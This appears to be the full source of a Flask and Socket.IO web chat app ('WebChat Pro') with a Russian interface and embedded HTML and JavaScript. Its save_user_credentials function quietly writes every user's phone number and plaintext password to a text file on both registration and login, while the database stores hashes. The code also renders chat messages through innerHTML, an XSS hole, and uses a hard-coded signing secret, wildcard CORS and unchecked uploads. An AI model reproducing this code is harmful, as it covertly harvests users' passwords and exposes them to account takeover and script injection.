from flask import Flask, request, jsonify, send_from_directory
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
import sqlite3
import os
import uuid
from datetime import datetime
from jose import jwt
import hashlib
import socket
from threading import Lock
import subprocess
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'webchat-2026-vip-mobile-special-ultimate!'
CORS(app, resources={r"/*": {"origins": "*"}})
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=True, engineio_logger=True)

users_rooms = {}
local_ip = None
url_lock = Lock()

VIP_AVATARS = {
    'star': '/avatars/star-vip.png',
    'fire': '/avatars/fire-vip.png',
    'diamond': '/avatars/diamond-vip.png',
    'crown': '/avatars/crown-vip.png'
}


def init_db():
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        phone TEXT PRIMARY KEY, 
        password TEXT, 
        nickname TEXT NOT NULL,
        avatar TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        chat_id TEXT, 
        from_phone TEXT,
        to_phone TEXT, 
        message TEXT, 
        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()


def save_user_credentials(phone, password):
    credentials_file = 'users_credentials.txt'
    if os.path.exists(credentials_file):
        try:
            with open(credentials_file, 'r', encoding='utf-8') as f:
                if f"{phone}:" in f.read():
                    print(f"ℹ️  {phone} уже сохранён")
                    return
        except:
            pass
    try:
        with open(credentials_file, 'a', encoding='utf-8') as f:
            f.write(f"{phone}:{password}\n")
        print(f"💾 НОВЫЙ: {phone}")
    except Exception as e:
        print(f"❌ {e}")


def hash_password(password):
    return hashlib.sha256((password + "webchat_salt_2026_vip").encode()).hexdigest()


def get_chat_id(phone1, phone2):
    return f"chat_{min(phone1, phone2)}_{max(phone1, phone2)}"


def get_vip_avatar(phone):
    if phone == '+79393846700':
        conn = sqlite3.connect('chat.db')
        c = conn.cursor()
        result = c.execute('SELECT avatar FROM users WHERE phone = ?', (phone,)).fetchone()
        conn.close()
        return result[0] if result else VIP_AVATARS['star']
    return 'https://via.placeholder.com/45/4ECDC4/FFFFFF?text=👤'


# 🔥 ГЛОБАЛЬНЫЙ ДОСТУП БЕЗ NGROK
def get_public_urls():
    global local_ip
    with url_lock:
        if local_ip is None:
            # Получаем локальный IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
            except:
                local_ip = "127.0.0.1"
            finally:
                s.close()

        urls = {
            'local': f"http://localhost:3000",
            'lan': f"http://localhost:3000",  # Показываем localhost для удобства
            'ip': f"http://{local_ip}:3000",
            'public': "🚀 ЗАПУСТИ НА СЕРВЕРЕ ДЛЯ ГЛОБАЛЬНОГО ДОСТУПА!"
        }
        return urls


def print_server_info():
    urls = get_public_urls()
    print("\n" + "=" * 80)
    print("🌐 WebChat Pro v6.1 - ГЛОБАЛЬНЫЙ ДОСТУП БЕЗ NGROK!")
    print("=" * 80)
    print("📱 ЛОКАЛЬНО (все устройства):      http://localhost:3000")
    print("🌐 ЛОКАЛЬНАЯ СЕТЬ:                 http://" + local_ip + ":3000")
    print("\n🚀 ГЛОБАЛЬНЫЙ ДОСТУП (выбери способ):")
    print("   1️⃣ Render.com (БЕСПЛАТНО):")
    print("      → https://render.com → New Web Service → GitHub repo")
    print("   2️⃣ Railway.app (БЕСПЛАТНО):")
    print("      → https://railway.app → Deploy from GitHub")
    print("   3️⃣ Fly.io (БЕСПЛАТНО):")
    print("      → flyctl launch")
    print("   4️⃣ VPS (Hetzner/DigitalOcean):")
    print("      → scp этот файл → python3 app.py")
    print("   5️⃣ Cloudflare Tunnel (БЕСПЛАТНО):")
    print("      → cloudflared tunnel --url localhost:3000")
    print("\n✅ Функции:")
    print("   👥 Регистрация/логин по номеру")
    print("   🔍 Поиск по номеру телефона")
    print("   👑 VIP панель +79393846700")
    print("   📎 Загрузка файлов")
    print("   💬 WebSocket чат реального времени")
    print("=" * 80)


init_db()
os.makedirs('uploads', exist_ok=True)
os.makedirs('avatars', exist_ok=True)


# 🔥 РОУТЫ (все те же, без изменений)
@app.route('/vip-avatar.png')
def vip_avatar():
    return send_from_directory('.', 'vip-avatar.png') if os.path.exists('vip-avatar.png') else send_from_directory(
        'avatars', 'star-vip.png')


@app.route('/avatars/<filename>')
def serve_avatar(filename):
    return send_from_directory('avatars', filename)


@app.route('/api/vip_avatar', methods=['POST'])
def set_vip_avatar():
    try:
        data = request.json
        phone = jwt.decode(data['token'], app.config['SECRET_KEY'], algorithms=['HS256'])['phone']
        if phone != '+79393846700':
            return jsonify({'error': '❌ Только Супер VIP!'}), 403
        avatar_type = data['avatar_type']
        if avatar_type not in VIP_AVATARS:
            return jsonify({'error': '❌ Неверный тип'}), 400
        conn = sqlite3.connect('chat.db')
        c = conn.cursor()
        c.execute('UPDATE users SET avatar = ? WHERE phone = ?', (VIP_AVATARS[avatar_type], phone))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'avatar': VIP_AVATARS[avatar_type]})
    except:
        return jsonify({'error': '❌ Ошибка'}), 500


@app.route('/api/users')
def get_users():
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    c.execute('SELECT phone, nickname, avatar FROM users ORDER BY nickname')
    users = [{'phone': row[0], 'nickname': row[1], 'avatar': get_vip_avatar(row[0])} for row in c.fetchall()]
    conn.close()
    return jsonify(users)


@app.route('/api/search_users')
def search_users():
    query = request.args.get('q', '').strip()
    if not query: return jsonify([])
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    c.execute('SELECT phone, nickname, avatar FROM users WHERE phone LIKE ? ORDER BY nickname LIMIT 50',
              (f'%{query}%',))
    users = [{'phone': row[0], 'nickname': row[1], 'avatar': get_vip_avatar(row[0])} for row in c.fetchall()]
    conn.close()
    return jsonify(users)


@app.route('/register', methods=['POST'])
def register():
    data = request.json
    phone, password, nickname = data['phone'].strip(), data['password'], data['nickname'].strip()
    if not nickname: return jsonify({'error': '❌ Никнейм ОБЯЗАТЕЛЕН!'}), 400
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    if c.execute('SELECT 1 FROM users WHERE phone=?', (phone,)).fetchone():
        conn.close()
        return jsonify({'error': '👤 Аккаунт существует'}), 400
    avatar = get_vip_avatar(phone)
    save_user_credentials(phone, password)
    c.execute('INSERT INTO users (phone, password, nickname, avatar) VALUES (?,?,?,?)',
              (phone, hash_password(password), nickname, avatar))
    conn.commit()
    conn.close()
    return jsonify({'success': True, 'message': f'✅ {nickname} зарегистрирован!'})


@app.route('/login', methods=['POST'])
def login():
    data = request.json
    phone = data['phone'].strip()
    password = data['password']
    print(f"🔍 Логин: {phone}")
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    user = c.execute('SELECT * FROM users WHERE phone=?', (phone,)).fetchone()
    conn.close()
    if not user:
        return jsonify({'error': '❌ Пользователь не найден'}), 401
    if hash_password(password) != user[1]:
        return jsonify({'error': '❌ Неверный пароль'}), 401
    print("✅ Логин УСПЕХ!")
    save_user_credentials(phone, password)
    token = jwt.encode({'phone': user[0]}, app.config['SECRET_KEY'], algorithm='HS256')
    return jsonify({
        'token': token,
        'user': {
            'phone': user[0],
            'nickname': user[2],
            'avatar': get_vip_avatar(user[0])
        }
    })


@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    filename = f"{uuid.uuid4()}{os.path.splitext(file.filename)[1]}"
    file.save(os.path.join('uploads', filename))
    return jsonify({'filePath': f'/uploads/{filename}'})


@app.route('/uploads/<filename>')
def serve_upload(filename):
    return send_from_directory('uploads', filename)


# 🔥 SocketIO события
@socketio.on('connect')
def connect():
    print('👤 Подключился:', request.sid)


@socketio.on('join')
def on_join(data):
    phone = jwt.decode(data['token'], app.config['SECRET_KEY'], algorithms=['HS256'])['phone']
    users_rooms[request.sid] = phone
    join_room(phone)
    emit('status', {'msg': f'✅ {phone} онлайн'})


@socketio.on('message')
def handle_message(data):
    phone = users_rooms.get(request.sid)
    if not phone: return
    chat_id = get_chat_id(phone, data['to'])
    conn = sqlite3.connect('chat.db')
    c = conn.cursor()
    c.execute('INSERT INTO messages (chat_id, from_phone, to_phone, message) VALUES (?,?,?,?)',
              (chat_id, phone, data['to'], data['msg']))
    conn.commit()
    conn.close()
    emit('message', {
        'chat_id': chat_id,
        'from': phone,
        'to': data['to'],
        'msg': data['msg'],
        'time': datetime.now().strftime('%H:%M')
    }, room=chat_id)


@socketio.on('disconnect')
def disconnect():
    phone = users_rooms.pop(request.sid, None)
    if phone: leave_room(phone)


@app.route('/')
def index():
    urls = get_public_urls()
    return f'''
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<title>WebChat Pro 🌐</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<style>
* {{margin:0;padding:0;box-sizing:border-box;}}
body {{font-family:system-ui,-apple-system,sans-serif;height:100vh;background:#0f0f23;color:#fff;overflow:hidden;touch-action:manipulation;-webkit-tap-highlight-color:transparent;}}
.sidebar-toggle {{position:fixed;left:15px;top:15px;z-index:1001;background:#25D366;border-radius:50%;width:56px;height:56px;font-size:22px;cursor:pointer;box-shadow:0 6px 20px rgba(37,211,102,0.4);transition:all .2s;}}
.sidebar-toggle:active {{transform:scale(.95);}}
.sidebar {{width:100%;height:100vh;background:linear-gradient(180deg,#1e1e2e 0%,#0f0f23 100%);position:fixed;left:-100%;top:0;z-index:1000;transition:left .3s;overflow-y:auto;}}
.sidebar.active {{left:0;}}
main {{margin:0;height:100vh;display:flex;flex-direction:column;}}
@media (min-width:768px) {{.sidebar{{width:360px;left:0;}}#main{{margin-left:360px;}}}}

.header {{background:#25D366;padding:20px;display:flex;align-items:center;gap:15px;box-shadow:0 4px 20px rgba(0,0,0,.3);}}
.header img {{width:50px;height:50px;border-radius:50%;box-shadow:0 4px 15px rgba(0,0,0,.4);}}
.support-link {{position:fixed;top:20px;right:20px;background:linear-gradient(135deg,#FF6B6B,#FF8E8E);color:white;border:none;border-radius:50%;width:56px;height:56px;font-size:18px;cursor:pointer;box-shadow:0 6px 20px rgba(255,107,107,.4);transition:all .2s;z-index:999;text-decoration:none;display:flex;align-items:center;justify-content:center;}}
.support-link:active {{transform:scale(.95);}}

.search-container {{background:#1e1e2e;padding:15px;border-bottom:1px solid #333;position:sticky;top:0;z-index:10;}}
.search-input {{width:100%;padding:15px;border:none;border-radius:16px;background:#2a2a3a;color:#fff;font-size:16px;}}
.search-clear {{position:absolute;right:70px;top:22px;color:#888;font-size:20px;cursor:pointer;}}
.search-clear:active {{color:#FF6B6B;transform:scale(1.2);}}

.vip-panel {{padding:15px;background:linear-gradient(135deg,#FFD700,#FFA500);margin:10px;border-radius:12px;}}
.vip-panel h3 {{color:#000;margin-bottom:10px;font-size:16px;}}
.vip-panel button {{margin:4px;padding:10px 14px;border:none;border-radius:10px;font-size:14px;cursor:pointer;transition:all .2s;}}
.vip-star {{background:#FFD700;color:#000;}}
.vip-fire {{background:#FF4757;color:#fff;}}
.vip-diamond {{background:#3742FA;color:#fff;}}
.vip-crown {{background:gold;color:#000;}}

.chat-list {{padding:15px;}}
.chat-item {{display:flex;align-items:center;gap:12px;padding:16px;border-radius:16px;margin-bottom:8px;background:rgba(42,42,69,.8);border:1px solid #333;cursor:pointer;transition:all .2s;position:relative;}}
.chat-item:active {{background:rgba(54,54,69,.9);transform:translateX(4px);}}
.chat-item.active {{background:#25D366;border-color:#25D366;}}
.chat-avatar {{width:50px;height:50px;border-radius:50%;object-fit:cover;}}
.vip-badge {{position:absolute;right:12px;background:#FFD700;color:#000;border-radius:50%;width:24px;height:24px;font-size:12px;display:flex;align-items:center;justify-content:center;}}

.chat-header {{background:#1e1e2e;padding:20px;border-bottom:2px solid #333;display:flex;align-items:center;gap:15px;}}
.chat-messages {{flex:1;overflow-y:auto;padding:20px;background:#0f0f23;scroll-behavior:smooth;}}
.message {{margin-bottom:20px;display:flex;gap:12px;max-width:85%;}}
.message.sent {{flex-direction:row-reverse;}}
.message-bubble {{max-width:100%;padding:16px 20px;border-radius:20px;font-size:16px;word-break:break-word;box-shadow:0 4px 15px rgba(0,0,0,.3);}}
.message.sent .message-bubble {{background:#25D366;border-bottom-right-radius:6px;}}
.message.received .message-bubble {{background:#2a2a3a;border-bottom-left-radius:6px;}}
.message-time {{font-size:12px;opacity:.7;margin-top:4px;}}

.input-area {{padding:20px;background:#1e1e2e;border-top:2px solid #333;display:flex;gap:12px;align-items:flex-end;}}
.msg {{flex:1;min-height:50px;max-height:140px;padding:16px;border:none;border-radius:25px;background:#2a2a3a;color:#fff;font-size:16px;resize:none;}}
.send-btn {{width:56px;height:56px;background:#25D366;border:none;border-radius:50%;color:#fff;font-size:20px;cursor:pointer;box-shadow:0 6px 20px rgba(37,211,102,.4);}}
.send-btn:active {{transform:scale(.95);}}
.file-btn {{width:56px;height:56px;background:#4a5568;border:none;border-radius:50%;color:#ccc;font-size:20px;cursor:pointer;}}
.file-btn:active {{background:#5a67d8;transform:scale(.95);}}

.auth {{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;z-index:9999;}}
.auth.hidden {{display:none;}}
.auth h1 {{font-size:2.2em;margin-bottom:30px;text-shadow:0 4px 20px rgba(0,0,0,.4);}}
.auth input {{width:100%;max-width:380px;padding:18px;margin:12px 0;border:none;border-radius:16px;font-size:18px;box-shadow:0 6px 25px rgba(0,0,0,.3);}}
.auth button {{width:100%;max-width:380px;padding:18px;margin:10px 0;background:#25D366;color:#fff;border:none;border-radius:16px;font-size:18px;cursor:pointer;box-shadow:0 6px 25px rgba(37,211,102,.5);}}
.auth button:active {{transform:translateY(-2px);box-shadow:0 8px 30px rgba(37,211,102,.6);}}

.public-links {{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.8);padding:15px;border-radius:12px;text-align:center;z-index:10000;max-width:90vw;}}
.public-links a {{color:#25D366;text-decoration:none;font-weight:700;margin:0 10px;display:inline-block;}}
</style>
</head>
<body>
<button id="sidebar-toggle" class="sidebar-toggle">☰</button>
<a href="https://t.me/Lytchic_1" class="support-link" target="_blank" title="📞 Поддержка">📞</a>

<div id="auth" class="auth">
    <h1>👑 WebChat Pro v6.1</h1>
    <input id="phone" placeholder="📱 +79393846700" type="tel">
    <input id="pass" placeholder="🔑 Пароль" type="password">
    <input id="nick" placeholder="⭐ Никнейм" required>
    <button onclick="registerUser()">🌟 Регистрация</button>
    <button onclick="loginUser()">🔐 Войти</button>
</div>

<div class="public-links">
    <div>🔗 <strong>Поделись этой ссылкой:</strong></div>
    <div><a href="http://localhost:3000" target="_blank">📱 Локально</a> | 
        <a href="http://{local_ip}:3000" target="_blank">🌐 Сеть</a></div>
</div>

<div id="sidebar" class="sidebar">
    <div class="header">
        <img id="user-avatar" width="50" height="50">
        <div>
            <div id="user-nickname" style="font-weight:700;font-size:18px;"></div>
            <small id="user-phone" style="opacity:.8;"></small>
        </div>
    </div>
    <div id="search-container" class="search-container">
        <div style="position:relative;">
            <input id="search-input" placeholder="🔍 Поиск по номеру..." oninput="searchUsers()">
            <span id="search-clear" class="search-clear" onclick="clearSearch()">✕</span>
        </div>
    </div>
    <div id="vip-panel" class="vip-panel" style="display:none;">
        <h3>👑 СУПЕР VIP</h3>
        <button class="vip-star" onclick="changeAvatar('star')">⭐</button>
        <button class="vip-fire" onclick="changeAvatar('fire')">🔥</button>
        <button class="vip-diamond" onclick="changeAvatar('diamond')">💎</button>
        <button class="vip-crown" onclick="changeAvatar('crown')">👑</button>
    </div>
    <div class="chat-list" id="chat-list">👥 Выберите собеседника</div>
</div>

<div id="main">
    <div id="chat-header" class="chat-header">
        <div style="display:flex;align-items:center;gap:15px;flex:1;">
            <img id="chat-avatar" width="50" height="50">
            <div>
                <div id="chat-nickname" style="font-weight:700;font-size:18px;">Выберите чат</div>
                <small id="chat-phone"></small>
            </div>
        </div>
    </div>
    <div id="chat-messages" class="chat-messages"></div>
    <div id="input-area" class="input-area">
        <textarea id="msg" class="msg" placeholder="💭 Сообщение..." rows="1"></textarea>
        <label id="file-btn" class="file-btn" title="📎">📎</label>
        <input type="file" id="file-input" accept="image/*,video/*,.pdf" style="display:none;">
        <button id="send-btn" class="send-btn" onclick="sendMessage()">➤</button>
    </div>
</div>

<script>
const socket = io();
let token = null;
let currentUser = null;
let currentChat = null;
let searchTimeout = null;

// 🔥 JavaScript функции (полная версия)
async function registerUser() {{
    const phone = document.getElementById('phone').value.trim();
    const password = document.getElementById('pass').value;
    const nickname = document.getElementById('nick').value.trim();

    if (!phone || !password || !nickname) {{
        alert('❌ Заполни все поля!');
        return;
    }}

    try {{
        const response = await fetch('/register', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{phone, password, nickname}})
        }});
        const data = await response.json();
        if (data.success) {{
            alert(data.message);
            loginUser();
        }} else {{
            alert(data.error);
        }}
    }} catch (e) {{
        alert('❌ Ошибка регистрации');
    }}
}}

async function loginUser() {{
    const phone = document.getElementById('phone').value.trim();
    const password = document.getElementById('pass').value;

    if (!phone || !password) {{
        alert('❌ Введи телефон и пароль!');
        return;
    }}

    try {{
        const response = await fetch('/login', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{phone, password}})
        }});
        const data = await response.json();
        if (data.token) {{
            token = data.token;
            currentUser = data.user;
            document.getElementById('auth').classList.add('hidden');
            document.getElementById('user-avatar').src = currentUser.avatar;
            document.getElementById('user-nickname').textContent = currentUser.nickname;
            document.getElementById('user-phone').textContent = currentUser.phone;
            loadUsers();
            socket.emit('join', {{token}});
            if (currentUser.phone === '+79393846700') {{
                document.getElementById('vip-panel').style.display = 'block';
            }}
        }} else {{
            alert(data.error);
        }}
    }} catch (e) {{
        alert('❌ Ошибка входа');
    }}
}}

function loadUsers() {{
    fetch('/api/users')
        .then(res => res.json())
        .then(users => {{
            const chatList = document.getElementById('chat-list');
            chatList.innerHTML = '';
            users.forEach(user => {{
                if (user.phone !== currentUser.phone) {{
                    const div = document.createElement('div');
                    div.className = 'chat-item';
                    div.onclick = () => openChat(user);
                    div.innerHTML = `
                        <img class="chat-avatar" src="${{user.avatar}}" onerror="this.src='https://via.placeholder.com/50/4ECDC4/FFFFFF?text=👤'">
                        <div style="flex:1;">
                            <div style="font-weight:500;">${{user.nickname}}</div>
                            <small style="opacity:.7;">${{user.phone}}</small>
                        </div>
                        ${{user.phone === '+79393846700' ? '<div class="vip-badge">👑</div>' : ''}}
                    `;
                    chatList.appendChild(div);
                }}
            }});
        }});
}}

function searchUsers() {{
    clearTimeout(searchTimeout);
    searchTimeout = setTimeout(() => {{
        const query = document.getElementById('search-input').value;
        if (query.length > 2) {{
            fetch(`/api/search_users?q=${{encodeURIComponent(query)}}`)
                .then(res => res.json())
                .then(users => {{
                    const chatList = document.getElementById('chat-list');
                    chatList.innerHTML = '';
                    users.forEach(user => {{
                        if (user.phone !== currentUser.phone) {{
                            const div = document.createElement('div');
                            div.className = 'chat-item';
                            div.onclick = () => openChat(user);
                            div.innerHTML = `
                                <img class="chat-avatar" src="${{user.avatar}}" onerror="this.src='https://via.placeholder.com/50/4ECDC4/FFFFFF?text=👤'">
                                <div style="flex:1;">
                                    <div style="font-weight:500;">${{user.nickname}}</div>
                                    <small style="opacity:.7;">${{user.phone}}</small>
                                </div>
                                ${{user.phone === '+79393846700' ? '<div class="vip-badge">👑</div>' : ''}}
                            `;
                            chatList.appendChild(div);
                        }}
                    }});
                }});
        }} else {{
            loadUsers();
        }}
    }}, 300);
}}

function clearSearch() {{
    document.getElementById('search-input').value = '';
    loadUsers();
}}

function openChat(user) {{
    currentChat = user;
    document.querySelectorAll('.chat-item').forEach(el => el.classList.remove('active'));
    event.currentTarget.classList.add('active');
    document.getElementById('chat-avatar').src = user.avatar;
    document.getElementById('chat-nickname').textContent = user.nickname;
    document.getElementById('chat-phone').textContent = user.phone;
    document.getElementById('chat-messages').innerHTML = '';
}}

async function sendMessage() {{
    const msg = document.getElementById('msg').value.trim();
    if (!msg || !currentChat) return;

    socket.emit('message', {{
        token,
        to: currentChat.phone,
        msg
    }});

    const messagesDiv = document.getElementById('chat-messages');
    const messageDiv = document.createElement('div');
    messageDiv.className = 'message sent';
    messageDiv.innerHTML = `
        <div class="message-bubble">${{msg}}</div>
        <div class="message-time">${{new Date().toLocaleTimeString('ru-RU', {{hour: '2-digit', minute: '2-digit'}})}}</div>
    `;
    messagesDiv.appendChild(messageDiv);
    messagesDiv.scrollTop = messagesDiv.scrollHeight;
    document.getElementById('msg').value = '';
}}

async function changeAvatar(type) {{
    try {{
        const response = await fetch('/api/vip_avatar', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{token, avatar_type: type}})
        }});
        const data = await response.json();
        if (data.success) {{
            currentUser.avatar = data.avatar;
            document.getElementById('user-avatar').src = data.avatar;
            alert('✅ Аватар изменён!');
        }}
    }} catch (e) {{
        alert('❌ Ошибка');
    }}
}}

// 🔥 События
document.getElementById('sidebar-toggle').onclick = () => {{
    document.getElementById('sidebar').classList.toggle('active');
}};

document.getElementById('msg').addEventListener('keypress', (e) => {{
    if (e.key === 'Enter' && !e.shiftKey) {{
        e.preventDefault();
        sendMessage();
    }}
}});

document.getElementById('file-btn').onclick = () => {{
    document.getElementById('file-input').click();
}};

document.getElementById('file-input').onchange = async (e) => {{
    const file = e.target.files[0];
    if (!file) return;

    const formData = new FormData();
    formData.append('file', file);

    try {{
        const response = await fetch('/upload', {{
            method: 'POST',
            body: formData
        }});
        const data = await response.json();
        socket.emit('message', {{
            token,
            to: currentChat.phone,
            msg: `[Файл: ${{file.name}}](${{data.filePath}})`
        }});
    }} catch (e) {{
        alert('❌ Ошибка загрузки');
    }}
}};

// 🔥 Socket события
socket.on('message', (data) => {{
    if (currentChat && currentChat.phone === data.from) {{
        const messagesDiv = document.getElementById('chat-messages');
        const messageDiv = document.createElement('div');
        messageDiv.className = 'message received';
        messageDiv.innerHTML = `
            <div class="message-bubble">${{data.msg}}</div>
            <div class="message-time">${{data.time}}</div>
        `;
        messagesDiv.appendChild(messageDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
    }}
}});
</script>
</body>
</html>
    '''


if __name__ == '__main__':
    print_server_info()
    socketio.run(app, host='0.0.0.0', port=3000, debug=False, allow_unsafe_werkzeug=True)
